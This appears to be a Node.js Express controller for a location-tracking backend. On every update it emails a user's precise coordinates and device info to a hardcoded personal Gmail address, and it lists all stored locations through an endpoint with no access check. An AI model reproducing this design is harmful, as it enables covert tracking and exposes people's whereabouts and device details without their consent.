
const locationModel = require('../models/locationModel');
const { sendLocationEmail } = require('../utils/emailSender');

// Track users who have already triggered an email this session
const emailedUsers = new Set();


exports.updateLocation = (req, res) => {
  const { userId, lat, lng, deviceInfo } = req.body;
  if (!userId || lat === undefined || lng === undefined) {
    return res.status(400).json({ error: 'Missing userId, lat, or lng' });
  }
  locationModel.updateUserLocation(userId, lat, lng);

  // Send email every time a location is received, with device info if provided
  const mapUrl = `https://www.google.com/maps/dir/?api=1&destination=${lat},${lng}`;
  const toEmail = 'd.wizard.techno@gmail.com';
  sendLocationEmail(toEmail, lat, lng, deviceInfo)
    .then(() => console.log('Location email sent! ', mapUrl, deviceInfo))
    .catch((err) => console.error('Failed to send email:', err));

  res.json({ success: true });
};

exports.getLocations = (req, res) => {
  res.json(locationModel.getAllUserLocations());
};
